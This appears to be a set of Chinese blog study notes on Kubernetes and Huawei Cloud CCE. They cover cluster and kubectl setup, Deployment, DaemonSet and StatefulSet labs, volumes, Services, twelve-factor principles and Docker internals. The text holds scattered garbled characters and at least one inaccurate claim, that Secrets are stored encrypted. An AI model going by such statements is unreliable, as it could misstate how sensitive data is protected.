选择镜像部署 选择模板部署 YAML部署\n云容器引|擎CCE支持通过CloudShell或kubectl客户端主机的方式连接和管理CCE集群。\nTest KubernetesMaster节点包含组件 kube-scheduler etcd\n2ubernetes的管理对象，从小到大的管理逻辑为 容器\u0026lt;Pod\u0026lt;ReplicaSet\u0026lt;Deployment\n环境搭建与 Kubernetes 组件实操指南 1.1 购买云容器引擎服务 CCE 登录与进入控制台登录后，依次点击左侧菜单栏 “服务列表”→“容器”→“云容器引擎 CCE”，进入 CCE 控制台。\n创建 CCE Standard 集群\n点击 “创建”，配置参数如下：\n计费模式：按需计费 集群名称：cce01 集群版本：推荐版本 集群规模：50 节点 集群 master 实例数：单实例 虚拟私有云：预置环境 VPC 控制节点子网：预置子网（选 VPC 后可见） 节点默认安全组：选择 “sg-hce” 并勾选声明 网络模型：容器隧道网络 容器网段：自动设置 取消勾选 “云原生监控插件” 和 “云原生日志采集插件”，点击 “提交”。 创建节点\n集群创建完成后，点击 “创建节点”，配置参数：\n计费模式：按需计费 可用区：随机分配 节点类型：弹性云服务器 - 虚拟机 节点规格：c7.xlarge.2 容器引擎：Containerd 操作系统：EulerOS 2.9 5 节点名称：cce01-node1 系统盘 / 数据盘：高 IO 50G/100G 弹性公网 IP：自动创建（5M 全动态 BGP） 勾选协议后点击 “提交”，等待 3-5 分钟节点池创建完成。\n1.2 购买弹性云服务器 进入 ECS 控制台点击左侧菜单栏 “服务列表”→“计算”→“弹性云服务器 ECS”。 2. 购买 ECS 实例\n基础配置：\n计费模式：按需计费 区域：北京四 规格：通用计算增强型 c7.large.2（2vCPU/4GiB） 镜像：CentOS 7.6 64bit（10GB） 系统盘：高 IO 40G 网络配置：\n网络：与 CCE 集群同 VPC\n安全组：sg-hce\n弹性公网 IP：按流量计费（5MB）\n名称：ecs-k8s\n确认配置后点击 “立即购买”，状态为 “运行中” 即创建完成。\n1.3 登录弹性云服务器 安全组配置\n进入 “安全组”，选择 “sg-hce”→“配置规则”→“入方向规则”→“一键放通常用端口”。 远程登录 打开 “Xfce 终端”，输入命令（替换【EIP】为 ECS 公网 IP）： ssh root@EIP 输入 “yes” 接受密钥，输入创建 ECS 时设置的密码（输入不显示，回车确认）。 1.4 安装 Kubernetes 客户端（kubectl） 下载配置文件\n进入 CCE 集群信息页面，在 “连接信息” 中点击 kubectl “配置”，选择有效期和 JSON 格式后下载 “kubeconfig.json”。 通过 scp 命令上传配置文件到 ECS： scp /home/user/Desktop/cce01-kubeconfig.json root@EIP:/root 安装与配置 kubectl\n登录 ECS 后执行以下命令： cd \\~ wget https://sandbox-expriment-files.obs.cn-north-1.myhuaweicloud.com:443/20221021/kubernetes-client-linux-amd64.tar.gz tar -zxvf kubernetes-client-linux-amd64.tar.gz cp /root/kubernetes/client/bin/kubectl /home/ cp cce01-kubeconfig.json /home/ cd /home chmod +x kubectl mv kubectl /usr/local/bin mkdir \\$HOME/.kube cp cce01-kubeconfig.json \\$HOME/.kube/config kubectl config use-context internal 验证安装\nkubectl cluster-info 回显 Kubernetes master is running at https://192.168.0.34:5443 CoreDNS is running at https://192.168.0.34:5443/api/v1/namespaces/kube-system/services/coredns:dns/proxy\n1.5 使用 kubectl 帮助命令 查看可用命令： kubectl --help 查看具体命令说明（如 get 命令）： kubectl get --help 二、Kubernetes 组件实操\n2.1 查看 Kubernetes 状态 查看节点状态：\nkubectl get node 查看命名空间：\nkubectl get namespace 创建 / 删除命名空间：\nkubectl create namespace new-namespace # 创建 kubectl delete namespace new-namespace # 删除 三、Deployment 实验\n3.1 运行第一个 Deployment 创建 Deployment：\nkubectl create deployment mydep --image=nginx 查看 Deployment：\nkubectl get deploy kubectl describe deployment mydep # 详细信息 CCE 控制台验证：进入 “工作负载”→“无状态负载” 查看 mydep。\nKubernetes 资源-工作负载\n3.2 使用 kubectl 命令行工具查看对象 查看所有对象： kubectl get all 查看指定命名空间对象： kubectl get all -n kube-system 交互模式查看变化（按 Ctrl+C 退出）： kubectl get deployment -w 查看完整信息： kubectl get deployment -o wide 3.3 创建自定义 Deployment 创建配置文件目录：\ncd / mkdir labfile/deployfile cd labfile/deployfile 编写 nginx-deployment.yaml：\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx spec: replicas: 3 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: name: nginx image: nginx:1.7.9 ports: containerPort: 80 部署与验证：\nkubectl apply -f nginx-deployment.yaml kubectl get deployment/pod # 等待2分钟查看Pod状态 3.4 弹性伸缩 Deployment 修改副本数：编辑 yaml 文件，将replicas: 3改为replicas: 5。\n应用变更：\nkubectl apply -f nginx-deployment.yaml 验证 Pod 数量：\nkubectl get pod 删除 Deployment：\nkubectl delete deployment nginx-deployment 四、DaemonSet 实验\n4.1 使用 DaemonSet 创建配置文件目录：\nmkdir /labfile/daemonfile cd /labfile/daemonfile 编写 DaemonSet.yaml：\napiVersion: apps/v1 kind: DaemonSet metadata: name: nginx-daemonset namespace: kube-system labels: k8s-app: nginx-daemonset spec: selector: matchLabels: name: nginx-daemonset template: metadata: labels: name: nginx-daemonset spec: containers: name: nginx-daemonset image: nginx:alpine 部署与验证：\nkubectl apply -f DaemonSet.yaml kubectl get daemonset/pod --namespace=kube-system # 指定命名空间 4.2 DaemonSet 自动恢复 删除 Pod（替换【Pod 名称】为实际名称）：\nkubectl delete pod 【Pod名称】 --namespace=kube-system 验证自动恢复：\nkubectl get pod --namespace=kube-system 退出 ECS：\nexit CCE K8s网络与持久化存储 描述Kubernetes的核心概念与架构掌握 通过Service访问Pod 掌握Kubernetes存储管理\nCRI CNI CSI runtime network storage\n##Service管理-创建可供外部访问的Service NodePort 如果需要Service可供外部进行访问，可以使用NodePort的方式。 。编辑yaml文件时，添加type参数。 。可以在使用nodePort字段指定对外服务端口，如果不进行指定系统会自动分配空闲端口。 。访问时通过访问“节点IP地址:端口“进行服务使用。\napiVersion: v1 kind: Service metadata: name: httpd-svc spec: type: NodePort selector: app: httpd ports: - protocol: TCP port: 8080 targetPort: 80 nodePort: 30144 k get service\nLoadBalancer模型 ·负载均衡（LoadBalancer） 可以通过弹性负载均衡从公网访问到工作负载，与NodePort加公网IP的方式相比提供了高可靠的保障。 ·LoadBalancerI此功能由集群外部负载均衡器提供商提供。\n通过kubectl命令行创建Service的yaml配置示例 在创建工作负载时通过kubectl命令行设置Service访问方式。以nginx为例，说明kubectl命令实现负载均衡(LoadBalancer)访问的方法。\napiVersion: v1 kind: Service metadata: annotations: kubernetes.io/elb.id: \u0026#34;5083f225-9bf8-48fa-9c8b-67bd9693c4c0\u0026#34; # ELBID，替换为实际值 kubernetes.io/elb.class: performance # 负载均衡器类型 name: nginx spec: ports: - name: service0 port: 80 protocol: TCP targetPort: 80 selector: app: nginx type: LoadBalancer Ingress概述 ·Service是基于四层TCP和UDP协议转发的，而在实际使用场景中，四层Service无法满足应用层存在的大量HTTP/HTTPS访问需求，因此需要使用七层负载均衡（Ingress）来暴露服务。 ·Ingress可基于七层的HTTP和HTTPS协议进行转发，它是Kubernetes集群中一种独立的资源，制定了集群外部访问流量的转发规则。这些转发规则可根据域名和路径进行自定义，IngressController根据这些规则将流量分配到一个或多个Service，完成对访问流量的细 粒度划分。\nK8s存储管理 Volume概述 ·Volume的核心是一个目录，其中可能存有数据，Pod中的容器可以访问该目录中的数据用户创建Volume时选择的卷类型将决定该目录如何形成，使用何种介质保存数据，以及规定目录中存放的内容。 Volume的生命周期与挂载它的Pod相同，但是Volume里面的文件可能在Volume消失后仍然存在，这取决于卷的类型。如当Pod不再存在时，Kubernetes也会销毁临时卷，但并不会销毁持久卷。\nVolume类型 ·Kubernetes支持多种卷类型，常用的类型有： emptyDir：一种简单的空目录，主要用于临时存储。 hostPath：将主机（节点）某个目录挂载到容器中，适用于读取主机上的数据。 ConfigMap：特殊类型，将Kubernetes特定的对象类型挂载到容器。 wyunSecret：特殊类型，将Kubernetes特定的对象类型挂载到容器。 PVC:PersistentVolumeClaim，用来挂载PersistentVolume（持久化卷），提供可靠的存储来保存应用的持久化数据。\nVolume管理 ·Kubernetes的Volume是Pod的一部分，并不是单独的对象，不能独立创建，只能在Pod中定义。 ·如hostPath类yaml示例，在.spec.containers[*].volumeMounts字段中声明卷在容器中的挂载位置；在.spec.volumes字段中设置为Pod提供的卷的信息。\n创建hostPath类volume的yaml示例\napiVersion: v1 kind: Pod metadata: name: test-pd spec: containers: - image: k8s.gcr.io/test-webserver name: test-container volumeMounts: - mountPath: /test-pd name: test-volume volumes: - name: test-volume hostPath: # 此字段根据volume类型可选 path: /data type: Directory EmptyDir简介 ·特征: 当Pod指定到某个节点上时，首先创建的是一个emptyDir卷，并且只要Pod在该节点上运行，卷就一直存在，卷最初是空的。尽管Pod中的容器挂载emptyDir卷的路径可能相同也可能不同，但是这些容器都可以读写emptyDir卷中相同的文件。当Pod因为某些原因被从节点上删除时，emptyDir卷中的数据也会永久删除。\nHostPath简介 特征: hostPath卷能将主机节点文件系统上的文件或目录挂载到Pod中。 ·使用场景： 运行需要访问Docker内部文件的容器：使用/var/lib/docker的hostPath。 在容器中运行cAdvisora使用/sys/fs/cgroup的hostPathoyun 其他使用到宿主机文件的场景。\nEmptyDir\napiVersion: v1 kind: Pod metadata: name: nginx spec: containers: - image: nginx:alpine name: test-container volumeMounts: - mountPath: /cache name: cache-volume volumes: - name: cache-volume emptyDir: {} hostPath\napiVersion: v1 kind: Pod metadata: name: test-hostpath spec: containers: - image: nginx:alpine name: hostpath-container volumeMounts: - mountPath: /test-pd name: test-volume volumes: - name: test-volume hostPath: path: /data # type 字段是可选的，可以根据需要添加，例如： # type: Directory ConfigMap简介 。特征: ConfigMap用于容器的配置文件管理，在被Pod引l用前需单独定义。它作为多个properties文件的应用，类似一个专门存储配置文件的目录，里面存放着各种配置文件。 ·应用场景： ConfigMap最为常见的使用方式就是在环境变量和Volume中引l用，能够实现image和应用程序的配置文件、命令行参数和环境变量等信息解耦。\nSecret简介 Secret是一种包含少量敏感信息例如密码、token或key的对象。 在创建、查看和编辑Pod的流程中Secret暴露风险较小。 ·特征: 系统会对Secret对象采取额外的预防措施，例如避免将其写入磁盘。 只有Pod请求的Secret在其容器中才是可见的，一个Pod不能访问另一个Pod的Secret。hidhwyun ·应用场景： Secret与ConfigMap非常像，都是key-value键值对形式，使用方式也相同，不同的是Secret会加密存储，所以适用于存储敏感信息。\nPV/PVC/SC概念介绍 ·PersistentVolume：持久化存储，简称PV，是Kubernetes对存储资源的抽象，属于集群资源，可以由管理员事先创建，或者使用存储类（StorageClass）实现动态供应。 ·PersistentVolumeClaim：持久化存储声明，简称pvC，是用户对存储卷（Pv）的申请，属于Namespace中的资源。 StorageClass：存储类，简称sc，为管理员提供了描述存储“类”的方法，通过相应的存储插件（CSI）实现，可根据用户提出的PVC动态提供不同性质的PV。\nPV和PVC创建和绑定 创建这个PV\n$ kubectl create -f pv.yaml persistentvolume/pv-example created 创建PVC\n$ kubectl create -f pvc.yaml persistentvolumeclaim/pvc-example created PVC可以绑定一个PV\napiVersion: v1 kind: PersistentVolumeClaim metadata: name: pvc-example spec: accessModes: - ReadWriteMany resources: requests: storage: 10Gi # 声明存储的大小 volumeName: pv-example # PV的名称 什么是云容器引擎CCE ·云容器引|擎（Cloud ContainerEngine，简称CCE），是基于开源Kubernetes、Docker技术的企业级容器服务。 ·借助云容器引擎，用户可以在华为云上轻松部署、管理和扩展容器化应用程序。\nCCE与Kubernetes关系 ·云容器引擎（CloudContainerEngine，简称CCE）是基于开源Kubernetes的云服务产品，提供高度可扩展的、高性能的企业级Kubernetes集群，支持运行Docker容器的环境。借助云容器引擎，可以在华为云上轻松部署、管理和扩展容器化应用。 ·华为云CCE是全球首批Kubernetes认证服务提供商（KubernetesCertifiedServiceProvider，KCSP），是国内最早投入Kubernetes社区的厂商，是容器开源社区主要贡献者和容器生态领导者 ·华为也是CNCF云原生计算基金会的创始成员及白金会员，CCE是全球首批通过CNCF基金会的 Kubernetes一致性认证的容器服务。\nCCE 及 Kubernetes 环境搭建与配置 已登录云控制台界面，鼠标移动到云桌面浏览器页面中左侧菜单栏，点击“服务列表”-\u0026gt;“容器”-\u0026gt;“云容器引擎CCE”，进入云容器引擎CCE控制台。\n1.创建CCE集群 集群配置参数 集群类型：CCE Standard 集群\n计费模式：按需计费\n集群名称：cce01\n集群版本：推荐版本\n集群规模：50节点\n集群masters实例数：单实例\n虚拟私有云：选择预置VPC\n控制节点子网：选择预置子网\n节点默认安全组：保持默认\n容器网络模型：容器隧道网络\n容器网段：自动设置\n操作步骤 点击“购买集群”按钮进入购买页面\n取消所有插件勾选 → 点击“下一步：规格确认”\n勾选“我已阅读并知晓上述使用说明” → 提交创建（耗时3-5分钟）\n集群创建完成后点击“创建节点”\n安装Kubernetes客户端\n2.1 登录弹性云服务器ECS ssh root@EIP # 替换EIP为ecs-k8s公网IP 2.2 下载kubectl配置 wget https://dl.k8s.io/v1.28.8/kubernetes-client-linux-amd64.tar.gz tar -zxvf kubernetes-client-linux-amd64.tar.gz cp kubernetes/client/bin/kubectl /usr/local/bin/ 2.3 配置kubeconfig mkdir $HOME/.kube mv cce01-kubeconfig.yaml $HOME/.kube/config kubectl config use-context internal 2.4 验证安装 kubectl cluster-info # 成功显示集群信息 Kubernetes网络\n3.1 Node与Pod通信 kubectl run nginx --image=nginx --port=80 # 创建nginx Pod kubectl get pods -o wide # 记录Pod IP ssh cce01-node1-IP # 登录CCE节点 curl Pod-IP # 验证节点与Pod通信 3.2 Pod间通信 kubectl run -it busybox --image=busybox # 创建busybox Pod kubectl get pods -o wide # 获取nginx和busybox Pod IP 在busybox Pod中执行：\ntelnet Pod-IP 80 # 验证Pod间通信 kubectl delete pod busybox nginx # 删除测试Pod Kubernetes存储\n4.1 使用emptyDir kubectl run em --image=ubuntu --dry-run=client -o yaml \u0026gt; empty-pod.yaml # 生成Pod配置 kubectl apply -f empty-pod.yaml kubectl exec em -it /bin/sh # 进入容器创建文件 cat \u0026gt; hello.file \u0026lt;\u0026lt;EOF hello world EOF exit kubectl delete pod em # 删除Pod后节点目录清空 4.2 emptyDir容量限制 limit-pod.yaml\napiVersion: v1 kind: Pod spec: containers: name: test-container2 image: ubuntu volumeMounts: name: cache-volume mountPath: /cache command: [\u0026#34;sleep\u0026#34;, \u0026#34;3600\u0026#34;] volumes: name: cache-volume emptyDir: sizeLimit: 1Gi kubectl apply -f limit-pod.yaml # 容器因超限进入Error状态 4.3 使用hostPath ssh cce01-node1-IP \u0026#34;mkdir /testdir\u0026#34; # 在节点创建目录 kubectl run hppod --image=ubuntu --dry-run=client -o yaml \u0026gt; hostPath-pod.yaml # 生成配置 kubectl apply -f hostPath-pod.yaml kubectl exec hppod -it /bin/sh # 写入文件 cat \u0026gt; hello2 \u0026lt;\u0026lt;EOF hello again EOF exit kubectl delete pod hppod # 删除Pod后节点文件保留 有状态负载(StatefulSet)\n5.1 创建Headless Service headless-service.yaml\napiVersion: v1 kind: Service metadata: name: headless spec: clusterIP: None selector: app: tomcat ports: port: 80 targetPort: 8080 kubectl apply -f headless-service.yaml kubectl get svc # 查看Service状态 5.2 部署StatefulSet tomcat-statefulset.yaml\napiVersion: apps/v1 kind: StatefulSet metadata: name: tomcat-statefulset spec: serviceName: headless replicas: 3 selector: matchLabels: app: tomcat template: metadata: labels: app: tomcat spec: containers: name: tomcat image: tomcat ports: containerPort: 8080 volumeMounts: name: www-storage mountPath: /usr/local/tomcat/webapps volumeClaimTemplates: metadata: name: www-storage spec: accessModes: [ \u0026#34;ReadWriteOnce\u0026#34; ] resources: requests: storage: 1Gi kubectl apply -f tomcat-statefulset.yaml kubectl get pods -w # 观察Pod有序创建 5.3 验证Pod DNS kubectl run dnsutils --image=tutum/dnsutils -- sleep infinity kubectl exec dnsutils -- nslookup headless.default.svc.cluster.local # 验证DNS解析 5.4 StatefulSet数据持久化 kubectl exec -it tomcat-statefulset-0 -- touch /usr/local/tomcat/webapps/hello.txt # 创建测试文件 kubectl delete pod tomcat-statefulset-0 # 删除Pod kubectl get pods -w # 观察Pod重建后名称不变 kubectl exec -it tomcat-statefulset-0 -- ls /usr/local/tomcat/webapps # 验证文件保留 ","permalink":"https://qfsyso.github.io/posts/kubernetes-k8s/","summary":"Kubernetes k8s 描述什么是Kubernetes 描述Kubernetes的基本架构及核心概念 描述Kubernetes的应用编排方法 使用华为云CCE创建简单工作负载\n容器编排技术 容器（如Docker）以及周边生态系统提供了很多工具来实现容器生命周期管理，能够满足在单台宿主机管理容器的需求。但越来越多企业开始使用容器，对容器技术的进一步发展提出了以下新的诉求： □高效的容器管理及编排。 □容器的跨主机部署及调度。 □容器的存储、网络、运维、安全等能力的拓展。 统一的容器编排管理工具\n容器编排的价值 容器编排是指自动化容器的部署、管理、扩展和联网，可为企业带来以下价值： 灵活的资源管理及调度 自动化部署及服务发现 高效的监控及运维 弹性扩展及高可用\n大规模容器集群管理工具，从Borg到Kubernetes ·Kubernetes起源于Google内部的Borg项目，它对计算资源进行了更高层次的抽象，通过将容器进行细致的组合，将最终的应用服务交给用户。它的目标是管理大规模的容器，提供基本的部署、维护以及应用伸缩等功能，其主要实现语言为Go语言。 ·Kubernetes作为容器集群管理工具，于2015年7月22日迭代到v1.0并正式对外公布。与此同时，谷歌联合Linux基金会及其他合作伙伴共同成立了CNCF基金会（CloudNativeComputingFoundation），并将Kuberentes作为首个编入CNCF管理体系的开源项目，助力容器技术生态的发展进步。\nKubernetes架构 ·一个基础的Kubernetes集群（Cluster）通常包含一个Master节点和多个Node节点。每个节点可以是一台物理机，也可以是一台虚拟机。\npod最小容器（container）\nKubernetes核心概念-Pod Pod是Kubernetes中最重要最基本的概念，Pod是Kubernetes最小工作单元。每一个Pod包含一个或多个相关容器，Kubernetes将Pod看做一个整体进行调度。 引入Pod的目的： 将联系紧密的容器封装在一个Pod单元内，以Pod整体进行调度、扩展和实现生命周期管理。 Pod内所有容器使用相同的网络Namespace和共享存储。即Pod内容器拥有相同IP地址和Port空间，容器间直接使用localhost通信。当挂载volume到Pod，即可实现将volume挂载到Pod中的每个容器。\nKubernetes核心概念-Controller ·工作负载是在Pod之上的一层抽象，我们可以通过控制器（controller）实现一系列基于Pod的高级特性，比如节点故障时Pod的自动迁移，Pod多副本横向扩展，应用滚动升级等。我们通常使用controller来做应用的真正的管理，而Pod是组成工作负载最小的单元\nKubernetes核心概念-Label ·当资源变得非常多的时候，如何分类管理就非常重要了，Kubernetes提供了一种机制来为资源分类，那就是Label（标签）。Label非常简单，但是却很强大，Kubernetes中几乎所有资源都可以用Label来组织。Label的具体形式是key-value的标记对，可以在创建资源的时候设置，也可以在后期添加和修改。\nKubernetes核心概念-Namespace ·命名空间（Namespace）是对一组资源和对象的抽象整合。在同一个集群内可创建不同的命名空间，不同命名空间中的数据彼此隔离。使得它们既可以共享同一个集群的服务，也能够互不干扰。 kube-public kube-system kube-node-lease default\nKubernetes核心概念-Service ·在Kubernetes中，Pod副本发生迁移或者伸缩的时候会发生变化，IP也是变化的。Kubernetes中的Service是一种抽象概念，它定义了一个Pod逻辑集合以及访问它们的策略。Service定义了外界访问一组特定Pod的方式。Service有自己的IP和端口，Service为Pod提供了负载均衡。\nKubernetes核心概念-Volume ·Volume用来管理Kubernetes存储，是用来声明在Pod中的容器可以访问的文件目录，含义如下： 声明在Pod中的容器可以访问的文件目录。 可以被挂载在Pod中一个或多个容器的指定路径下。 支持多种后端存储（本地存储、分布式存储、云存储等）。\nKubernetes管理-Kubectl ·Kubectl是Kubernetes的命令行工具。通过kubectl，用户能对集群进行管理，并在集群上进行容器化应用的安装部署。\nKubectl支持以下对象管理方式： 指令式：通过kubectl内置的驱动命令，如:kubectl +create/scale/delete/..+参数的形式， 直接快速创建、更新和删除Kubernetes对象。\n声明式：使用kubectlapply创建指定目录中配置文件所定义的所有对象。通常，此配置文件 采用yaml进行描述。\nKubernetes管理-命令行语法 在Kubernetes中的很多操作都是用kubectl来完成，通过其命令可以管理Deployment、Replicaset、ReplicationController、Pod等，进行操作、扩容、删除等全生命周期操作，同时可以对管理对象进行查看或者监控资源使用情况。\nkubectl的语法\nkubectl [command] [TYPElNAME] [flags] Command：指定你希望进行的操作，如create，get，describe，delete等。 TYPE：指定操作对象的类型，如deployment，pod，service等。 hiPnNAME：指定对象的名字。hidhwyun flags:可选的标志位。\nKubernetes管理-yaml示例 ·kubernetes中的对象可以使用YAML描述（如果您对YAML格式不了解，可以参考YAML语法少，也可以使用JSON。其内容可以分为如下四个部分： typeMeta：对象类型的元信息，声明对象使用哪个API版本，哪个类型的对象。 objectMeta：对象的元信息，包括对象名称、使用的标签等。 spec：对象的期望状态，例如对象使用什么镜像、有多少副本等。 status：对象的实际状态，只能在对象创建后看到，创建对象时无需指定。","title":"Kubernetes k8s"},{"content":"云原生应用十二要素原则解析表 原则 核心价值 实现方法 技术案例 1. 基准代码 快速交付；合理划分边界 单一代码库+多环境部署，版本控制统一管理 Git仓库管理，Kubernetes多集群部署 2. 依赖 提升开发效率；排除意外风险 显式声明依赖+隔离环境（容器化） Docker镜像打包依赖，Helm Chart管理应用包 3. 配置 软件发布管理；环境无差别 配置与代码分离→环境变量注入 Kubernetes ConfigMap/Secret动态加载 4. 后端服务 弹性/敏捷；解耦状态管理 将慢速进程（如DB/队列）转为RESTful服务 Redis缓存服务，消息队列(Kafka)独立部署 5. 构建发布运行 持续交付；流水线自动化 CI/CD全流程自动化（构建→测试→部署） Jenkins/GitLab CI流水线，K8s Rolling Update 6. 进程 云兼容性；无状态设计 应用无状态化，会话数据外置后端服务 会话存储Redis，文件存储OSS 7. 端口绑定 自包含服务；独立暴露接口 服务直接监听端口，不依赖Web服务器转发 Spring Boot内嵌Tomcat，gRPC直连 8. 并发 自动弹性伸缩 水平扩展替代垂直扩展，依赖云平台弹性能力 Kubernetes HPA自动扩缩容 9. 易处理 快速故障恢复 断路器模式+优雅终止，进程可随时启停 Istio服务熔断，K8s Liveness探针 10. 环境等价 可靠性；开发与生产环境一致 容器化保证环境一致性，禁用环境特殊配置 Docker跨环境运行，开发环境Minikube 11. 日志 实时系统监控 日志作为事件流→集中式管理 EFK栈(Elasticsearch+Fluentd+Kibana) 12. 管理进程 运维效率；运营解耦 管理任务（如DB迁移）作为独立进程，与主应用隔离 K8s Job/CronJob执行批处理任务 特性 云原生应用 传统应用 可预测性 符合弹性框架，通过容器编排和微服务实现可预测行为 不可预测，批量发布易引发单点故障，扩展能力有限 操作系统依赖 抽象化（容器技术隔离OS依赖，实现跨平台运行） 强依赖（需特定OS环境，迁移困难） 资源调度 弹性伸缩（按需自动分配资源，利用率＞70%） 冗余静态（预留资源应对峰值，利用率＜40%） 团队协作 DevOps驱动（开发运维一体化，自动化流水线） 部门墙隔离（开发/测试/运维独立，沟通成本高） 开发模式 敏捷迭代（CI/CD支持每日多次部署） 瀑布模型（数月/年周期发布，变更困难） 服务架构 微服务（独立部署、高内聚低耦合） 单体架构（模块紧耦合，牵一发而动全身） 运维能力 自动化（K8s实现自愈、监控、扩缩容） 手动操作（人工监控、故障排查效率低） 故障恢复 秒级恢复（容器快速重启+服务网格流量调度） 小时级恢复（依赖备份还原，流程复杂） 云原生架构模式:微服务架构 云原生架构演进原则 01.弹性 微服务采用无状态设计支持按需使用、自动水平伸缩;实例快速启动，并在不影响业务的前提下优雅中止。\n02.分布式 应用分布式:业务逻辑与数据解耦、业务逻辑与会话解耦;数鶼習揿僥髦据分布式:去中心、自均衡、最终一致性;跨可用区的部署与调度。\n03.高可用 基于不可靠、可抛弃的资源设计高可用、反脆弱系统，应用任意(微)服务实例失效，系统能够快速发现、隔离并自动恢复;云基础设施和平台服务发生任意单点故障不影响系统整体可用性。 04. 自动化 系统能够自动化部署、升级和扩综容，支持自动化监控、告警、故障的定界定位和故障自愈。 05 自服务 服务可被其他应用或开发猼联蒼晴菋捯笥鐸耐蔡顢錚穩助发现，自助按需获取，自助使用并计量，自助服务管理。\n云原生应用架构思考:单体架构的局限性 单体架构的问题不在于不可拆分上，在于无法隔离和自治。应用规模越大，局限性越明显\n云原生架构模式:微服务架构\n微服务独立性和敏捷性更好，架构持续演进更容易，更适合云原生应用\n云原生架构模式:Serverless架构 Serverless(无服务器架构)指的是由开发者实现的服务端逻辑运行在无状态的计算容器中，它由事件触发，完全被第三方管理，Serverless是在传统容器技术和服务网格上发展起来，更侧重让使用者只关注自己的业务逻辑即可。\nServerless方案业务价值 更轻量化:用户专注于业务创新和代码开发，代码运行环境由云平台提供，无需管理基础设施资源。 更快弹性:根据请求的并发数量自动调度资源运行函数，毫秒级弹性伸缩，高效应对业务峰值。 更低成本:根据函数调用次数、运行时长和节点转换次数计费，函数不运行时不产生费用，更加节省成本。\nServerless与微服务的关系:微服务向Serverless演进，并长期共存。\n容器资源管理 Docker容器实现原理 Docker容器通过namespace技术实现进程隔离，通过cgroup技术实现容器进程可用资源的限制。 Docker启动一个容器时，实际是创建了包含多个namespace参数的进程。\nNamespace Namespace:命名空间 作用:资源隔离。 原理:namespace将内核的全局资源进行封装，使得每个namespace都有一份独立的资源。因此不同进程在各自namespace内对同一种资源的使用不会相互干扰。\nLinux Namespace 类型整理 Namespace 类型 系统调用参数 隔离内容 引入的内核版本 PID Namespace CLONE_NEWPID 进程空间（进程 ID） Linux 2.6.24 Mount Namespace CLONE_NEWNS 文件系统挂载点 Linux 2.6.19 Network Namespace CLONE_NEWNET 网络资源（网络设备、端口等） 始于 Linux 2.6.24，完成于 2.6.29 User Namespace CLONE_NEWUSER 用户 ID 和用户组 ID 始于 Linux 2.6.23，完成于 Linux 3.8 UTS Namespace CLONE_NEWUTS 主机名和域名 Linux 2.6.19 IPC Namespace CLONE_NEWIPC 信号量、消息队列和共享内存 Linux 2.6.19 Cgroups Cgroups: Linux Control Group。 作用:限制一个进程组对系统资源的使用上限，包括CPU、内存、BlockI/O等。 Cgroups还可以设置进程优先级，对进程进行挂起和恢复等操作。 原理:将一组进程放在一个Cgroup中，通过给这个Cgroup分配指定的可用资源，达到控制这一组进程可用资源的目的实现:在Linux中，Cgroups以文件和目录的方式组织在操作系统的/sys/fs/cgroup路径下。该路径中所有的资源种类均可被Cgroup限制。\n内存限额 容器可使用的内存包括两个部分:物理内存和swap。Docker通过两组参数来控制容器内存的使用量: -m或-memory:设置内存的使用限额。 \u0026ndash;memory-swap:设置内存+swap的使用限额。\nCPU限额 默认设置下，所有容器可以平等地使用host CPU资源并且没有限制。Docker可以通过-c或\u0026ndash;cpu-shares设置容器使用CPU的权重。\nBlock lO带宽限额 默认情况下，所有容器能平等地读写磁盘，可以通过设置\u0026ndash;blkio-weight参数来改变容器block 10的优先级。\n容器网络与存储 ##Docker原生网络 Docker提供如下5种原生的Network drivers。\n模型 说明 None (dk安装时) none 网络中的容器不能与外部通信。 Host (dk安装时) 容器加入到宿主机的 Network Namespace，容器直接使用宿主机网络。 Bridge (dk安装时) 默认网络驱动程序。主要用于多个容器在同一个 Docker 宿主机上通信。 Overlay 基于 Linux 网桥和 VXLAN，可实现跨主机的容器通信。 Macvlan 通过为容器分配物理网卡的 MAC 地址，适用于需要与物理网络通信的场景。 Host网络 挂在host网络上的容器共享宿主机的network namespace。即容器的网络配置与host网络配置完全一样。 容器创建时，可以通过\u0026ndash;network=host指定使用host网络。\nBridge网络 Bridge网络是docker使用最广泛、也是默认的网络。 Docker安装时会创建一个名为docker0的linuxbridge。如果不指定\u0026ndash;network，创建的容器默认都会挂到docker0上。docker0网络创建时已默认配置了subnet子网。\nUser-defined网络 除了自动创建的none、host、bridge三个网络，用户可按需创建user-defined网络。Docker提供三种user-defined bridge网络驱动:bridge、oyerlay和macvlan。我们可以通过bridge驱动创建类似前面默认的bridge网络。\n容器数据卷 卷就是目录或文件，存在于一个或多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过Union File system提供一些用于持续存储或共享数据的特性。卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在容器删除时删除其挂载的数据卷. 启动容器的时候直接使用-v命令就可以进行数据卷的挂载。 还可以在Dockerfile中使用VOLUME指令来给镜像添加一个或多个数据卷。\nVolume Volume由docker管理，是将特定目录挂载给容器。Docker会在指定路径/var/lib/docker/volumes下为每个volume生成一个目录作为mount源。 Volume创建过程: 容器启动时，简单的告诉docker:\u0026ldquo;我需要一个volume存放数据，帮我mount到目录/abc\u0026rdquo;。 Docker在/var/lib/docker/volumes 中生成一个随机目录作为mount源。 如果/abc已经存在，则将数据复制到mount源。 将volume mount到/abc。 docker volume ls\nBind mount Bind mount是将宿主机上已有的目录或文件mount到容器中。\nTmpfs mount Volumes和bind mounts是在容器和宿主机之间做数据共享，将数据持久化到宿主机上。 tmpfs mounts是将文件创建在容器可写层之外，实际落在宿主机的内存中。 使用tmpfs mounts的限制: 宿主机OS是Linux。 无法向volumes和bind mounts一样，在容器之间共享文件。\n容器与Host共享数据 两种类型的 data volume均可实现在容器与 host 之间共享数据，但方式有所不同。 bind mount: 直接将要共享的目录mount到容器。 volume: 由于volume位于host中的目录，是在容器启动时才生成，所以需要将共享数据拷贝到volume中。使用docker cp命令在容器与Host之间复制数据。使用cp命令将需要共享的数据copy到该volume的目录下。\n容器之间共享数据 bind mount:将Host上的目录或文件mount到多个容器中。 volume:将volume挂载到多个容器中。 volume container:先通过volume或bind mount将数据挂载到一个container中，其他容器再引用这个container中的数据。 data-packed volume container:将数据打包到镜像中，然后volume 共享。\n云原生解决方案 云原生基础设施底座 容器引擎 容器网络 容器存储 30秒创建1000个容器\n基于云原生基础设施的多云管理解决方案 多集群、多区域、多云统一应用管理能力，实现更大规模业务支撑能力，更灵活的弹性与容灾能力。 